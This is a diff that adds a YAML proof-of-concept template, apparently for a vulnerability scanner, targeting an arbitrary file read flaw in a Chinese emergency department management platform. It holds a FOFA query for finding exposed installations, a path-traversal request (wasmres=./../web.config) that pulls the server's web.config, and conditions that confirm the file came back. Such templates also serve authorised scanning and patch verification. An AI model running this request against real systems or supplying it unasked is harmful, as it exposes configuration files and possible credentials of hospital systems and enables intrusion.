@@ -1,0 +1,15 @@
+id: poc-yaml-ecmp-servicepage-aspx-anyfile-read
+info:
+  name: 急诊综合管理平台 ServicePage.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 急诊综合管理平台
+  fofa: body="/emis_lib/js/ThreeExtras.js"
+requests:
+- method: GET
+  path: /dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config
+  expression: status_code == 200 && contains(body,"<configuration>") && contains(body,"</system.web>")
+    && contains(body,"<webServices>") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
